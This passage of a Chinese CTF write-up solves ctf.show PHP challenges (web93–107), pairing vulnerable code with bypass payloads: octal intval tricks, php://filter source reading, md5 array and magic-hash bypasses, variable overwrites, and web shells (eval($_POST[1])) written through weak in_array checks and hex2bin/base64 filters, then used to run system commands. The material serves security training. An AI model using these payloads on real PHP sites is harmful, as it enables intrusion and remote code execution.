class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还是一样的Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">010574</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>说明</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数：<span class="title function_ invoke__">strpos</span>(<span class="keyword">string</span>, find [,start])</span><br><span class="line">说明：</span><br><span class="line"><span class="keyword">string</span>是规定被搜索的字符串；find是规定要查找的字符；start是规定开始搜索的位置。</span><br><span class="line">返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 <span class="literal">FALSE</span>。</span><br><span class="line">注释：字符串位置从 <span class="number">0</span> 开始，不是从 <span class="number">1</span> 开始。</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">010574</span></span><br><span class="line">?num=<span class="number">4476.0</span>    <span class="comment">#由于intval()只识别整数部分</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;<span class="comment">//表明要存在0且不在首位</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>用<code>8进制</code>表示法绕过4476数字。</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">010574</span></span><br></pre></td></tr></table></figure>


<h1 id="web96-路径问题"><a href="#web96-路径问题" class="headerlink" title="web96(路径问题)"></a>web96(路径问题)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php #利用LFI来查看源码</span></span><br><span class="line">/<span class="keyword">var</span>/www/html/flag.php              绝对路径</span><br><span class="line">./flag.php                          相对路径</span><br><span class="line">php:<span class="comment">//filter/resource=flag.php      php伪协议 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>利用<code>数组</code>进行绕过即可得到flag</p>
<p>Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">#若存在GET传值，用POST的值覆盖</span></span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">#flag参数等于flag，就用$_COOKIE进行覆盖。这里让flag参数不等于flag值就好了</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">#存在HTTP_FLAG参数等于flag，就出最终的flag答案</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>三元运算符在c语言里学过，不难理解<strong>三元运算符语法：条件 ? 结果1 : 结果2</strong>说明：问号前面的位置是判断的条件，如果满足条件时执行结果1，不满足时执行结果2。</p>
<p>这句代码可以展开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>一旦用get方法传入参数，就会把get方法改为post方法，这里达到了修改get方法地址的目的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;<span class="comment">//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地</span></span><br><span class="line">址)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>中间两行代码不需要考虑，因为不提交 flag 参数，只要在用get方法传入参数的基础上再post传 <strong>HTTP_FLAG&#x3D;flag</strong>，即可得到flag。</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//c8c910aa-6434-42db-9dde-1db5025cffba.chall.ctf.show/?1</span></span><br><span class="line">然后POST数据：HTTP_FLAG=flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web99（in-array弱类型比较）"><a href="#web99（in-array弱类型比较）" class="headerlink" title="web99（in_array弱类型比较）"></a>web99（in_array弱类型比较）</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这题突破点在in_array()函数</p>
<p><strong>in_array()</strong><br>in_array：(PHP 4, PHP 5, PHP 7)</p>
<p>功能：检查数组中是否存在某个值</p>
<p>定义：<code> bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p>
<p>在 $haystack中搜索 $needle，<code>如果第三个参数 $strict的值为 TRUE，则 in_array()函数会进行强检查，</code>检查 $needle的类型是否和 $haystack中的相同。如果找到 $haystack，则返回 TRUE，否则返回 FALSE。</p>
<p>很明显，这题再使用in_array()函数时并没有设置第三个参数为TRUE,所以此时是&#x3D;&#x3D;的弱类型比较。</p>
<p>**绕过方法:**传入n&#x3D;1.php。因为PHP在使用 in_array()函数判断时，会将 1.php强制转换成数字1，而数字1在 range(1,24)数组中，当随机生成的数字正好是1时绕过 in_array()函数判断，导致任意文件上传漏洞。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?n=<span class="number">1</span>.php   </span><br><span class="line">post:   content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>  <span class="comment">#写入一句话</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>多试几次，直到不报错的那一次，说明成功传入一句话。</p>
<p>然后访问<code>https://url/1.php</code>,再post传入<code>1=system(&#39;ls&#39;);</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>再访问这个flag36d.php,即post: 1&#x3D;<code>system(&#39;cat flag36d.php&#39;);</code></p>
<p>然后在网页源码中看到flag</p>
<h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title class_">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>很明显要get传入三个参数，并且保证<code>is_numeric($v1) and is_numeric($v2) and is_numeric($v3)</code>的结果是True，才能继续执行，也就是v1和v2和v3中至少有一个是数字就行。</p>
<p>第二部分:<br>因为源码中给了提示 ：flag in class ctfshow;，所以输出一个新的”ctfshow”类，构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>


<p>得到 flag_is_bde4fb430x2d62590x2d404f0x2dbaa30x2da2d6bd94ed98<br><code>把ox2d换成-，再套上ctfshow&#123;&#125;即可</code></p>
<p>注意这里v3只能包含;，可以是多个叠加，但不能有其他字符。</p>
<h2 id="利用var-dump的解法："><a href="#利用var-dump的解法：" class="headerlink" title="利用var_dump的解法："></a>利用var_dump的解法：</h2><p>var_dump() 函数用于输出变量的相关信息。</p>
<p>构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)&amp;v3=;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>两种方法均可，原理是直接打印ctfshow类的信息。</p>
<h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><p>这题在web100的基础上过滤了很多东西</p>
<p>反射一下类即可，new ReflectionClass</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>


<p>可以得到flag，但是要爆破16次flag少给一位。</p>
<h1 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h1><h3 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin()函数"></a>hex2bin()函数</h3><p><strong>作用</strong>:把十六进制值转换为 ASCII 字符</p>
<h3 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h3><p>语法:**substr(string,start,length)**如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">6</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>则输出从第六位开始，即输出”world”</p>
<h3 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h3><p>语法:<strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong></p>
<p>第一个参数作为回调函数调用,其余参数是回调函数的参数。</p>
<p>源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>is_numeric在php5的环境中，是可以识别十六进制的。</p>
<p>先把一句话编码成十六进制传给v2:</p>
<p><code>&lt;?php eval($_POST[1]);?&gt;</code>变为<code>0x3c3f706870206576616c28245f504f53545b315d293b3f3e</code></p>
<p>构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v2=<span class="number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span>&amp;v3=<span class="number">1</span>.php</span><br><span class="line">v1=hex2bin</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>但是没有成功写入，参考了大佬的博客，得知这里的版本可能是php7，这一串十六进制不能被is_numeric()识别成数字，v2必须由纯数字构成。</p>
<p>这里用大佬的payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //这里直接用去掉=的base64</span><br><span class="line">输出   <span class="number">5044383959474e6864434171594473</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>带e的话会被认为是科学计数法，可以通过is_numeric检测。<br />大家可以尝试下去掉&#x3D;和带着&#x3D;的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。</p>
<p>同时因为经过substr处理，所以v2前面还要补两位任意数字，这里使用00</p>
<p>最终构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v2=<span class="number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php </span></span><br><span class="line"></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure>


<p>访问1.php，查看源码得到flag</p>
<h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p>数组绕过</p>
<h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><p>变量覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?suces=flag </span><br><span class="line">POST: error=suces</span><br></pre></td></tr></table></figure>


<p>先分析这个get请求:</p>
<p>当传入suces&#x3D;flag时，实际上执行的是$suces&#x3D;$flag<br />即把flag赋值给了suces变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>再看post请求:</p>
<p>传入error&#x3D;suces,得到error&#x3D;$suces&#x3D;$flag </p>
<p>即成功把flag的值赋给了error变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>所以能成功回显出flag</p>
<p>可以看到在这个过程中,suces变量只是起到了一个传递的作用，所以可以被任意替换，即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?a=flag </span><br><span class="line">POST: error=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?v2[]=a </span><br><span class="line">POST: v1[]=b</span><br></pre></td></tr></table></figure>


<h1 id="web107-parse-str变量覆盖"><a href="#web107-parse-str变量覆盖" class="headerlink" title="web107(parse_str变量覆盖)"></a>web107(parse_str变量覆盖)</h1><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><p>parse_str() 函数把查询字符串解析到变量中。</p>
<p>注释:如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
<p>注释:php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p>
<ul>
<li>Parse_str()函数引起的变量覆盖漏洞<br>  <code>parse_str() </code>函数用于把查询字符串解析到变量中，如果没有<code>array 参数</code>，则由该函数设置的变量将覆盖已存在的同名变量。 极度不建议 在没有 array参数的情况下使用此函数，并且在 PHP 7.2 中将废弃不设置参数的行为。此函数没有返回值</li>
</ul>
<p>要得到flag，需要v2中flag的值与传入v3的md5的值相同:</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get：?v3=<span class="number">1</span></span><br><span class="line">post:v1=flag=c4ca4238a0b923820dcc509a6f75849b <span class="comment">#md5解密后对应1</span></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">0x01</span> <span class="title function_ invoke__">md5</span>(str)</span><br><span class="line"> </span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span 